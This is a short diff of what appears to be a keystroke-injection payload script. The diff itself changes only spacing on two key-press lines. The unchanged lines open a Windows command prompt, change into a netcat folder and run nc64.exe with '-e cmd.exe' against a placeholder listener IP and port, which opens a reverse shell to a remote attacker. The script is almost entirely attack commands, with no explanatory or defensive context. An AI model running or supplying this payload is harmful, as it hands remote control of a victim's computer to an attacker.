@@ -1,8 +1,8 @@
-Press: 131+114
+Press:131+114
 PrintLine:cmd
 PrintLine:cd ..
 PrintLine:cd ..
 PrintLine:cd Windows
 PrintLine:cd netcat-1.11
 PrintLine:nc64.exe <listener-ip> <listener-port> -e cmd.exe
-Press: 131+217
+Press:131+217
